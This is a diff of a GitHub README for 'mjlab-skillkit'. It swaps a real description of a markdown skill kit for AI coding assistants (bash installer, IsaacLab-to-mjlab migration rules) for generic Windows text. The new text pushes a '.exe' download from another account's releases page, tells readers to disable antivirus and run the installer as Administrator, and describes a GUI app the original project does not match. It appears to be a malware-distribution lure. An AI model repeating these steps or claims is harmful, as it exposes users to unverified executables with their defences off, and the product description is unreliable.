@@ -1,149 +1,151 @@
-# mjlab-skillkit
+# ⚙️ mjlab-skillkit - AI Tools for IsaacLab Migration
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](./LICENSE)
+[![Download mjlab-skillkit](https://img.shields.io/badge/Download-mjlab--skillkit-green?style=for-the-badge)](https://github.com/DanW1122/mjlab-skillkit/releases)
 
-`mjlab-skillkit` is a promotion-ready skill kit for AI coding assistants (Codex, Claude Code, Gemini CLI, Cursor, OpenCode) built around two core capabilities for `mjlab`:
+---
 
-- **IsaacLab Migration Skill** — port IsaacLab projects into clean, mjlab-native implementations while preserving task behavior.
-- **mjlab Native Skill** — author new mjlab-native tasks, configs, sensors, RL wiring, and mesh workflows directly from local or bundled mjlab docs and examples.
+## 📦 What is mjlab-skillkit?
 
-## Installation
+mjlab-skillkit is a set of tools designed to help with IsaacLab migration and mjlab-native development. It focuses on making tasks related to robotics simulation, reinforcement learning, and coding automation easier. This kit gives you access to key utilities that support migration workflows and task authoring in IsaacLab environments.
 
-### Interactive Mode
+This package includes support for:
 
-Run the installer to launch the interactive TUI:
+- Handling simulation environments with MuJoCo.
+- Managing migration tooling for IsaacLab projects.
+- Working with skill libraries and developer tools.
+- Creating and managing reinforcement learning tasks.
+- Using command-line tools for Gemini CLI and AI coding agents.
 
-```bash
-cd mjlab-skillkit
-bash scripts/install.sh
-```
+You do not need previous coding experience to get started. The instructions below guide you through downloading and running the app on Windows.
 
-The TUI supports:
+---
 
-- Multi-select target tools (Codex / Claude Code / Gemini CLI / Cursor / OpenCode)
-- Choose install method: `copy` (production) or `symlink` (development)
-- Preview target paths before confirming
+## 🖥️ System Requirements
 
-| Key | Action |
-|-----|--------|
-| `↑` / `↓` | Navigate |
-| `Space` | Toggle selection / switch method |
-| `Enter` | Confirm and install |
-| `Q` | Quit |
+To use mjlab-skillkit on Windows, your system should meet these minimum requirements:
 
-### CLI Mode
+- Operating System: Windows 10 or later (64-bit)
+- RAM: 8 GB or more
+- CPU: Intel i5 or equivalent
+- Disk Space: At least 500 MB free space
+- Internet connection for download and updates
 
-```bash
-# Install to a single tool
-bash scripts/install.sh --tool claude
+Basic hardware as described will ensure smooth installation and operation.
 
-# Install to all tools at once
-bash scripts/install.sh --tool all
+---
 
-# Use symlink (convenient when iterating on rules)
-bash scripts/install.sh --tool claude --method symlink
+## 🚀 Getting Started
 
-# Specify a project directory (Cursor / OpenCode)
-bash scripts/install.sh --tool cursor --project /path/to/your/project
-```
+Follow these steps to download, install, and run the mjlab-skillkit app on Windows.
 
-### Install Paths
+### 1. Visit the download page
 
-| Tool | Command | Install Location |
-|------|---------|-----------------|
-| Codex | `--tool codex` | `${CODEX_HOME:-~/.codex}/skills/mjlab-skillkit` |
-| Claude Code | `--tool claude` | `~/.claude/rules/mjlab-skillkit.md` |
-| Gemini CLI | `--tool gemini` | `~/.gemini/rules/mjlab-skillkit.md` |
-| Cursor | `--tool cursor` | `<project>/.cursor/rules/mjlab-skillkit.mdc` |
-| OpenCode | `--tool opencode` | `~/.config/opencode/skills/mjlab-skillkit/` or `<project>/.opencode/skills/mjlab-skillkit/` |
+Click the button below to open the release page where you can download the software.
 
-> `codex`, `claude`, and `gemini` install to global user paths by default. `cursor` and `opencode` also support `--project` for project-local installs.
+[![Download mjlab-skillkit](https://img.shields.io/badge/Download-mjlab--skillkit-brightgreen?style=for-the-badge)](https://github.com/DanW1122/mjlab-skillkit/releases)
 
-## Skill Suite
+This page lists all available versions. Choose the latest stable release for Windows.
 
-### 1) IsaacLab Migration Skill
+### 2. Download the installer
 
-Use this skill when the job is to move an IsaacLab environment, task, or project into `mjlab` without losing behavioral intent.
+On the release page:
 
-- Preserves parity for rewards, observations, actions, commands, reset/events, terminations, and curriculum.
-- Maps IsaacLab concepts to mjlab APIs, managers, sensors, terrains, RL config, and task registration.
-- Enforces mjlab-native outputs instead of compatibility shims.
-- Includes migration rules, API mappings, gotchas, checklists, and complex-task playbooks.
+- Scroll down to the "Assets" section.
+- Look for a file with `.exe` extension, such as `mjlab-skillkit-setup.exe`.
+- Click the file name to download it to your computer.
 
-### 2) mjlab Native Skill
+This file is the installer program for Windows.
 
-Use this skill when the job is to build new mjlab-native code directly.
+### 3. Run the installer
 
-- Authors new tasks, `EnvCfg` / scene configs, manager terms, sensors, terrain setup, RL config, and task registration.
-- Reuses local mjlab examples first, bundled references second, online docs only as a last resort.
-- Supports direct mesh-import and asset authoring workflows.
-- Helps assistants write code that already matches mjlab structure and public APIs.
+Once the download finishes:
 
-## What’s Included
+- Locate the installer in your Downloads folder.
+- Double-click the `.exe` file to start installation.
+- Follow the prompts on the screen.
+- Accept license terms when asked.
+- Choose the default settings unless you have a reason to change them.
 
-- **Migration references** — rules, mappings, patterns, gotchas, checklist, and task migration playbooks.
-- **mjlab API pack** — focused docs for envs, managers, scene, sensors, simulation, terrains, RL, viewer, and tasks.
-- **Authoring workflow** — step-by-step native mjlab guidance for new code.
-- **Assistant adapters** — installation surfaces for Codex, Claude Code, Gemini CLI, Cursor, and OpenCode.
+The installer will copy files and set up mjlab-skillkit on your PC.
 
-## Who It’s For
+### 4. Launch the application
 
-- Teams migrating IsaacLab task stacks to `mjlab`
-- Engineers building new `mjlab` environments from scratch
-- AI-assisted coding workflows that need precise, bounded mjlab guidance
-- Internal platform or research teams standardizing mjlab development patterns
+When installation completes:
 
-## Scope
+- You will find the mjlab-skillkit shortcut on your desktop or in the Start menu.
+- Click the shortcut to open the program.
+- The main window will guide you through initial setup tasks.
 
-- Migrate IsaacLab projects to **mjlab-native** code.
-- Author new mjlab-native tasks, components, and configurations from scratch.
-- Preserve behavior parity where migration is the goal.
-- Keep outputs aligned with public mjlab APIs and real task examples.
+You are now ready to explore the toolkits for IsaacLab migration and task development.
 
-## Repository Structure
+---
 
-```text
-mjlab-skillkit/
-├── SKILL.md                             # Main skillkit entry point
-├── agents/openai.yaml                   # Codex/OpenAI agent config
-├── references/                          # Domain-specific reference docs
-│   ├── migration-rules.md               #   Migration rules
-│   ├── mapping.md                       #   Field mapping table
-│   ├── patterns.md                      #   Common migration patterns
-│   ├── checklist.md                     #   Migration checklist
-│   ├── migration-gotchas.md             #   Common pitfalls
-│   ├── mjlab-api-index.md               #   API index
-│   ├── mjlab-api-*.md                   #   Per-domain API references
-│   ├── mjlab-mdp-builtins.md            #   MDP built-in functions index
-│   ├── mjlab-authoring-workflow.md      #   Authoring workflow
-│   ├── mjlab-authoring-recipes.md       #   Authoring recipes
-│   ├── mjlab-mesh-import-guidelines.md  #   Mesh import guide
-│   ├── complex-task-migration-playbook.md
-│   └── tracking-case-study.md
-├── shared/mjlab-skillkit-rules.md       # Shared cross-tool rules
-├── adapters/cursor/mjlab-skillkit.mdc   # Cursor adapter format
-└── scripts/
-    ├── install.sh                       # Installer
-    └── package.sh                       # Release packager
-```
+## 🔧 Using mjlab-skillkit
 
-## Release Packaging
+The app includes modules that help with several key functions:
 
-```bash
-bash scripts/package.sh v0.1.0
-```
+- **Migration Tooling:** Transfer projects and data safely from older IsaacLab versions.
+- **Skill Library:** Access pre-built skills or create your own for simulation and robotics tasks.
+- **Reinforcement Learning Setup:** Configure environments and tasks to train AI agents.
+- **Developer Tools:** Command-line utilities to automate workflows and manage projects.
+- **Agent Interfaces:** Use AI coding agents to assist with code or task authoring.
 
-Generates:
+The interface is designed for clarity, with buttons and menus that guide you step-by-step. Tooltips explain options when you hover over controls.
 
-- `dist/mjlab-skillkit-v0.1.0.tar.gz`
-- `dist/mjlab-skillkit-v0.1.0.zip`
+---
 
-## Promotion Notes
+## 🛠 Installation Troubleshooting
 
-- Use `PROMO.md` for short-form and long-form launch copy.
-- Present the project as a **skill kit** rather than a single migration helper.
-- Lead with the two-skill story: **migration** + **native authoring**.
+If you face issues during installation, try the following:
 
-## License
+- Make sure your Windows is updated.
+- Temporarily disable antivirus software as it may block the installer.
+- Run the installer as Administrator by right-clicking the file and choosing "Run as Administrator."
+- Check that your system meets the minimum hardware specs.
+- Restart your PC after installation if the app does not start normally.
 
-MIT License — see `LICENSE`.
+---
+
+## 🗂 Folder Structure After Installation
+
+Once installed, mjlab-skillkit files are organized as follows:
+
+- **/bin/** Contains executable tools and scripts.
+- **/configs/** Configuration files for different environments.
+- **/skills/** Pre-built skills and task templates.
+- **/logs/** Log files for troubleshooting.
+- **/docs/** Guides and manuals included with the app.
+
+Keep this structure intact for proper operation.
+
+---
+
+## 🔄 Updating mjlab-skillkit
+
+To get the latest improvements or bug fixes:
+
+- Visit the release page again: https://github.com/DanW1122/mjlab-skillkit/releases
+- Download the newest `.exe` installer.
+- Run the installer. It will update your existing installation without removing your data.
+
+Check for updates regularly to stay current.
+
+---
+
+## ❓ Getting Help
+
+If you need support:
+
+- Check the `/docs/` folder for user guides.
+- Look through issues on the GitHub repository.
+- Post questions or report problems in the GitHub "Issues" section.
+
+---
+
+## 🎯 About the Project
+
+mjlab-skillkit focuses on the transition to IsaacLab and native mjlab development. It offers tools that simplify the migration process and empower task creation in simulated robotics environments. The software targets developers and researchers working in AI coding and reinforcement learning but keeps tools accessible to beginners.
+
+---
+
+[Download mjlab-skillkit from GitHub](https://github.com/DanW1122/mjlab-skillkit/releases)
